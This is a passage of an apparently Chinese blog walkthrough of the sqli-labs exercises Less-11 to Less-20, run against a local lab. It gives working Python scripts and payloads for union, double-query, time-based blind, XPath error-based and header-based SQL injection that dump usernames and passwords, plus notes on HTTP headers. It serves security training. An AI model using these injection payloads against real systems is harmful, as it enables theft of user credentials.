+基于错误的POST单引号字符型注入</h4>
+<p>和<strong>Less-1</strong>大同小异，把<strong>get</strong>换成<strong>post</strong>罢了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-11/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&quot;-1&#x27; union select 1,group_concat(username,&#x27;,&#x27;,password,&#x27;\n&#x27;) from users #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
+<h4 id="less-12-基于错误的post双引号变形字符型注入">Less-12
+基于错误的POST双引号变形字符型注入</h4>
+<p>和<strong>Less-4</strong>大同小异，把<strong>get</strong>换成<strong>post</strong>罢了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-12/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&#x27;-1&quot;) union select 1,group_concat(username,&quot;,&quot;,password,&quot;\n&quot;) from users #&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
+<h3 id="x05-post双查询注入">0X05 POST双查询注入</h3>
+<h4 id="less-13-基于双查询的post单引号变形字符型注入">Less-13
+基于双查询的POST单引号变形字符型注入</h4>
+<p>原理同<strong>Less-5</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-13/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&quot;-1&#x27;) union select 1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27;,&#x27;,password) from users limit 0,1),&#x27; &#x27;, floor(rand(0)*2)) #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
+<h4 id="less-14-基于双查询的post双引号字符型注入">Less-14
+基于双查询的POST双引号字符型注入</h4>
+<p>原理同<strong>Less-5</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-14/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&#x27;-1&quot; union select 1,count(*) as a from information_schema.tables group by concat((select concat(username,&quot;,&quot;,password) from users limit 0,1),&quot; &quot;, floor(rand(0)*2)) #&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
+<h3 id="x05-post单查询盲注">0X05 POST单查询盲注</h3>
+<h4 id="less-15-基于时间的post单引号字符型盲注">Less-15
+基于时间的POST单引号字符型盲注</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-15/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    startTime = time.time()</span><br><span class="line">    payload = <span class="string">&quot;admin&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,sleep(2),1) #&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uname&quot;</span>: payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))=&#123;mid&#125;,sleep(2),1) #&quot;</span></span><br><span class="line">            startTime = time.time()</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), mid=<span class="built_in">str</span>(j))</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h4 id="less-16-基于时间的post双引号变形字符型盲注">Less-16
+基于时间的POST双引号变形字符型盲注</h4>
+<p>和<strong>Less-15</strong>差不多，测试一下使用双引号加右括号构造闭合。</p>
+<h3 id="x06-post更新注入">0x06 POST更新注入</h3>
+<h4 id="less-17-基于错误的post更新注入">Less-17
+基于错误的POST更新注入</h4>
+<p>随手测试了一下，<strong>usernae</strong>被过滤了，<strong>password</strong>可以注入。</p>
+<h5 id="相关补充-2">相关补充</h5>
+<h6
+id="extractvaluexml_fragxpath_expr">extractvalue(xml_frag,xpath_expr)</h6>
+<p>这里需要提及的一个是<strong>extractvalue(xml_frag,xpath_expr)</strong>函数，作用是对<strong>xml</strong>文档进行查询，其中第一个接收的参数是文件名，第二个则是文件路径，因此对第二个参数传入的值会做检测，判断是否满足如<strong>/xxx/xxx/xxx/</strong>的<strong>xpath</strong>格式，错误则会返回该值并报错，由于传入的是查询语句，因此会在执行后获取返回值再判断，故返回的是查询结果，从而达到攻击目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; or extractvalue(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a))) --+&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<h6
+id="updatexmlxml_targetxpath_exprnew_xml">updatexml(xml_target,xpath_expr,new_xml)</h6>
+<p>将<strong>xml_target</strong>中的数据使用<strong>xpath_expr</strong>正则匹配替换为<strong>new_xml</strong>，报错原理同上。</p>
+<p>故此，思路是要使得<strong>extractvalue()</strong>函数报错，因此构造<strong>extractvalue(1,concat('~',(select
+database())))</strong>，同理，使用<strong>updatexml()</strong>构造的<strong>payload</strong>为<strong>updatexml(1,concat('~',(select
+database())),0)</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a)),0) --+&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<h4 id="less-18-基于错误的post-user-agent注入">Less-18 基于错误的POST
+User-Agent注入</h4>
+<h5 id="相关补充-3">相关补充</h5>
+<h6 id="http头部详解">HTTP头部详解</h6>
+<ul>
+<li><strong>Accept</strong>：客户端申明自己接受的介质类型，<strong>/</strong>表示任何类型，<strong>type/</strong><em>表示该类型下的所有子类型，如<strong>text/</strong></em>，<strong>type/sub-type</strong>表示单独一种类型，如<strong>text/html</strong>。</li>
+<li><strong>Accept-Charset</strong>：客户端申明自己接收的字符集。</li>
+<li><strong>Accept-Encoding</strong>：客户端申明自己接收的编码函数，通常指定压缩函数，是否支持压缩，
+支持什么压缩函数【<strong>gzip、deflate</strong>。</li>
+<li><strong>Accept-Language</strong>：客户端申明自己接收的语言，语言跟字符集的区别：中文是语言，中文有多种字符集，比如<strong>big5、gb2312、gbk</strong>等等。</li>
+<li><strong>Accept-Ranges</strong>：<strong>Web</strong>服务器表明自己是否接受获取其某个实体的一部分【比如文件的一部分的请求。<strong>bytes</strong>表示接受，<strong>none</strong>表示不接受。</li>
+<li><strong>Age</strong>：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</li>
+<li><strong>Authorization</strong>：当客户端接收到来自<strong>Web</strong>服务器的<strong>WWW-Authenticate</strong>响应时，用该头部来回应自己的身份验证信息给<strong>Web</strong>服务器。</li>
+<li><strong>Cache-Control</strong>：请求：<strong>no-cache</strong>【不要缓存的实体，要求现在从<strong>Web</strong>服务器去取；<strong>max-age</strong>【只接受<strong>Age</strong>值小于<strong>max-age</strong>值，并且没有过期的对象；<strong>max-stale</strong>【可以接受过去的对象，但是过期时间必须小于<strong>max-stale</strong>值；<strong>min-fresh</strong>【接受其新鲜生命期大于其当前<strong>Age</strong>跟<strong>min-fresh</strong>值之和的缓存对象。响应：<strong>public【</strong>可以用<strong>Cached</strong>内容回应任何用户；<strong>private</strong>【只能用缓存内容回应先前请求该内容的那个用户；<strong>no-cache</strong>【可以缓存，但是只有在跟<strong>Web</strong>服务器验证了其有效后，才能返回给客户端；<strong>max-age</strong>:【本响应包含的对象的过期时间。ALL：<strong>no-store</strong>【不允许缓存。</li>
+<li><strong>Connection</strong>：请求：<strong>close</strong>【告诉<strong>Web</strong>服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了；<strong>keepalive</strong>【告诉<strong>Web</strong>服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求。响应：<strong>close</strong>【连接已经关闭；<strong>keepalive</strong>【连接保持着，在等待本次连接的后续请求；<strong>Keep-Alive</strong>【如果客户端请求保持连接，则该头部表明希望<strong>Web</strong>服务器保持连接多长时间【秒。如<strong>Keep-Alive:
+300</strong>。</li>
+<li><strong>Content-Encoding</strong>：<strong>Web</strong>服务器表明自己使用了什么压缩函数【<strong>gzip、deflate</strong>压缩响应
+中的对象。如<strong>Content-Encoding: gzip</strong>。</li>
+<li><strong>Content-Language</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的语言。</li>
+<li><strong>Content-Length</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的长度。如<strong>Content-Length:
+26012</strong>。</li>
+<li><strong>Content-Range</strong>：<strong>Web</strong>服务器表明该响应包含的部分对象为整个对象的哪个部分。如<strong>Content-Range:
+bytes 21010-47021/47022</strong>。</li>
+<li><strong>Content-Type</strong>：<strong>Web</strong>服务器告诉客户端自己响应的对象的类型。如<strong>Content-Type:
+application/xml</strong>。</li>
+<li><strong>ETag</strong>：就是一个对象【如<strong>URL</strong>的标志值，就一个对象而言，比如一个<strong>html</strong>文件，
+如果被修改了，其<strong>Etag</strong>也会别修改，所以<strong>ETag</strong>的作用跟<strong>Last-Modified</strong>的作用差不多，主
+要供<strong>Web</strong>服务器判断一个对象是否改变了。比如前一次请求某个<strong>html</strong>文件时，获得了其<strong>ETag</strong>，当这次又请求这个文件时，客户端就会把先前获得的<strong>ETag</strong>值发送给<strong>Web</strong>服务器，
+然后<strong>Web</strong>服务器会把这个<strong>ETag</strong>跟该文件的当前<strong>ETag</strong>进行对比，然后就知道这个文件有没有改变了。</li>
+<li><strong>Expired</strong>：<strong>Web</strong>服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟<strong>Web</strong>服务器验证了其有效性后，才能用来响应客户请求，<strong>HTTP/1.0</strong>的头部。如<strong>Expires:
+Sat, 23 May 2009 10:02:12 GMT</strong>。</li>
+<li><strong>Host</strong>：客户端指定自己想访问的<strong>Web</strong>服务器的<strong>Domain/IP</strong>地址和端口号。如<strong>Host:
+southsea.st</strong>。</li>
+<li><strong>If-Match</strong>：如果对象的<strong>ETag</strong>没有改变，其实也就意味著对象没有改变，才执行请求的动作。</li>
+<li><strong>If-None-Match</strong>：如果对象的<strong>ETag</strong>改变了，其实也就意味著对象也改变了，才执行请求的动作。</li>
+<li><strong>If-Modified-Since</strong>：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作【比如返回对象，否则返回代码<strong>304</strong>，告诉客户端该对象没有修改。如<strong>If-Modified-Since:
+Thu, 10 Apr 2008 09:14:42 GMT</strong>。</li>
+<li><strong>If-Unmodified-Since</strong>：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作【比如返回对象。</li>
+<li><strong>If-Range</strong>：客户端告诉<strong>Web</strong>服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。客户端通过发送请求对象的<strong>ETag</strong>或者自己所知道的最后修改时间给<strong>Web</strong>服务器，让其判断对象是否改变了。总是跟<strong>Range</strong>头部一起使用。</li>
+<li><strong>Last-Modified</strong>：<strong>Web</strong>服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。如<strong>Last-Modified:
+Tue, 06 May 2008 02:42:43 GMT</strong>。</li>
+<li><strong>Location</strong>：<strong>Web</strong>服务器告诉客户端，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如:
+<strong>Location: https://southsea.st</strong>。</li>
+<li><strong>Pramga</strong>：主要使用<strong>Pramga:
+no-cache</strong>，相当于<strong>Cache-Control:
+no-cache</strong>。如<strong>Pragma: no-cache</strong>。</li>
+<li><strong>Proxy-Authenticate</strong>：代理服务器响应客户端，要求其提供代理身份验证信息。<strong>Proxy-Authorization</strong>：客户端响应代理服务器的身份验证请求，提供自己的身份信息。</li>
+<li><strong>Range</strong>：客户端【比如<strong>Flashget</strong>多线程下载时告诉<strong>Web</strong>服务器自己想取对象的哪部分。如<strong>Range:
+bytes=1173546-</strong>。</li>
+<li><strong>Referer</strong>：客户端向<strong>Web</strong>服务器表明自己访问当前请求的来源。如<strong>Referer:
+https://southsea.st</strong>。</li>
+<li><strong>Server</strong>：<strong>Web</strong>服务器表明自己是什么软件及版本等信息。如<strong>Server:
+Apache/2.0.61(Unix)</strong>。</li>
+<li><strong>User-Agent</strong>：客户端表明自己的身份【哪种客户端。如<strong>Mozilla/5.0
+(Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/76.0.3809.100 Safari/537.36</strong>。</li>
+<li><strong>Transfer-Encoding</strong>：<strong>Web</strong>服务器表明自己对本响应消息体【不是消息体里面的对象作了怎样的编码，比如是否分块【<strong>chunked</strong>。如<strong>Transfer-Encoding:
+chunked</strong>。</li>
+<li><strong>Vary</strong>：<strong>Web</strong>服务器用该头部的内容告诉<strong>Cache</strong>服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源<strong>Web</strong>服务器在接到第一个请求消息时，其响应消息的头部为<strong>Content-Encoding:
+gzip; Vary:
+Content-Encoding</strong>，那么<strong>Cache</strong>服务器会分析后续请求消息的头部，检查其<strong>Accept-Encoding</strong>，是否跟先前响应的<strong>Vary</strong>头部值一致，即是否使用相同的内容编码函数，这样就可以防止<strong>Cache</strong>服务器用自己<strong>Cache</strong>里面压缩后的实体响应给不具备解压能力的客户端。如<strong>Vary:
+Accept-Encoding</strong>。</li>
+<li><strong>Via</strong>：列出从客户端到<strong>OCS</strong>或者相反方向的响应经过了哪些代理服务器，他们用什么协议【版本发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加<strong>Via</strong>头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的<strong>Via</strong>头部，并
+把自己的相关信息加到后面，以此类推，当<strong>OCS</strong>收到最后一个代理服务器的请求时，检查<strong>Via</strong>头部，就知道该请求所经过的路由。如<strong>Via:
+1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</strong>。</li>
+</ul>
+<p>根据提示，修改<strong>User-Agent</strong>的值来注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select * from (select concat_ws(&#x27;,&#x27;,id,username,password) from users limit 0,1) a))) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<h4 id="less-19-基于错误的post-referer注入">Less-19 基于错误的POST
+Referer注入</h4>
+<p>根据提示，修改<strong>Referer</strong>的值如上。</p>
+<h4 id="less-20-基于错误的post-cookie注入">Less-20 基于错误的POST
+Cookie注入</h4>
+<p>根据提示，修改<strong>Cookie</strong>的值如上。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8%E4%BF%AE%E7%82%BC%E8%AE%A1%E5%88%92/" rel="tag"><i class="fa fa-tag"></i> Web安全修炼计划</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018-MOCTF/" rel="prev" title="2018 MOCTF欢乐新春赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2018 MOCTF欢乐新春赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Upload-Labs/" rel="next" title="Web安全文件上传修炼计划">
+                  Web安全文件上传修炼计划 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
